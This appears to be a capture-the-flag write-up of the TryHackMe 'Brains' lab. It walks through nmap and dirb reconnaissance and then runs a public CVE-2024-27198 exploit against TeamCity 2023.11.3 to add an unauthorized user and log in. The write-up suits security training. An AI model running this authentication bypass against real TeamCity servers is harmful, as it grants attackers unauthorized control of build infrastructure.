
https://tryhackme.com/r/room/brains

Scan all TCP hosts
```
nmap -p-  10.10.142.253 

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
39383/tcp open  unknown
50000/tcp open  ibm-db2
```

Finger specific ports
```
nmap -p 22,80,39383,50000 -sV -sC 10.10.142.253

22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 082f246011aa613e5b71c85c379bf56d (RSA)
|   256 e950836d5cc222944c8ac93a32effda9 (ECDSA)
|_  256 6a2ce18a44f2fd18533103878d32b234 (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Maintenance
39383/tcp open  java-rmi Java RMI
50000/tcp open  ibm-db2?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 401 
|     TeamCity-Node-Id: MAIN_SERVER
|     WWW-Authenticate: Basic realm="TeamCity"
|     WWW-Authenticate: Bearer realm="TeamCity"
|     Cache-Control: no-store
|     Content-Type: text/plain;charset=UTF-8
|     Date: Sat, 05 Oct 2024 00:36:09 GMT
|     Connection: close
|     Authentication required
|     login manually go to "/login.html" page
|   drda, ibm-db2, ibm-db2-das: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 05 Oct 2024 00:36:09 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Enumerate website directory with extensions file
```
 dirb http://10.10.142.253 /usr/share/wordlists/dirb/big.txt -x extensions_common.txt

```

In the meantime I will see which service is running on port 50000
The service Team City is running on this port
The version running is 2023.11.3 (build 147512)
When you search for exploits on google for this version there are some results

https://github.com/yoryio/CVE-2024-27198

I used yorio's vulnerability posted on github
I cloned the repo
Navigated inside of the folder
Changed the permissions to allow execution by the root user
Then executed the Python script aimed at the vuln web service with new credentials to be added to the database. 
```
git clone https://github.com/yoryio/CVE-2024-27198.git
cd CVE-2024-27198
chmod +x CVE-2024-27198.py 
python3 CVE-2024-27198.py -t http://10.10.183.8:50000 -u newrandomuser -p mypassword 
```

I'm now able to login to the TeamCity Application with the username newrandomuser and the password mypassword.
